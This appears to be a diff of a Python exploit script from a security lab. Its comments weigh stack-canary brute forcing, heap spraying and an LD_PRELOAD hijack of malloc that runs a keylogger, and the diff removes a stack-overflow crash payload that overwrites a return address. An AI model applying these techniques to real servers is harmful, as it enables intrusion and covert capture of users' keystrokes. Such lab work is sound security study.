@@ -1,5 +1,5 @@
 '''
-[FINDINGS]
+### FINDINGS ###
 1 Fork process on server and brute force test possible values for the stack canary to find the stack cookie X Can't run shell code DEP or ROPChain due to ASLR (can't leak it too)
 2 Leak the stack canary from the stack and just use that X ServerData private
 3 Heap spray X DEP and heap is not executable
@@ -9,9 +9,10 @@
   After that when the program calls a function, the dynamic linker resolves it to our wrapper instead of the original function.
   So for example we can override the malloc function to run the keylog binary which is included in the shared library
   But how to get the shared library on the server and set the LD_PRELOAD environment variable?
+  Again find a exploit in the program to write the shared library to the server and set the LD_PRELOAD environment variable
 
-[EXPLOIT SUMMARY]
-
+### EXPLOIT SUMMARY ###
+No exploit found due to time constraints
 '''
 
 from keystone import *
@@ -28,17 +29,11 @@ log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log bu
 
 ### FUNCTIONS ###
 
-
 ### PAYLOAD ###
 message_prefix = b"GET /data.txt HTTP/1.1\r\n"
 message_prefix_len = len(message_prefix)
 
-### CREATE THE CRASH PAYLOAD ###
-crash = message_prefix
-padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) # extra 8 bytes to account for the caller's rbp
-crash += b"q" * padding_size # add padding
-crash += 0xffffffffffffffff.to_bytes(8, "little") # add new little endian return address
-crash += b"\r\n\r\n"
+### CREATE THE ATTACK PAYLOAD ###
 
 
 ### PERFORM ATTACK ###
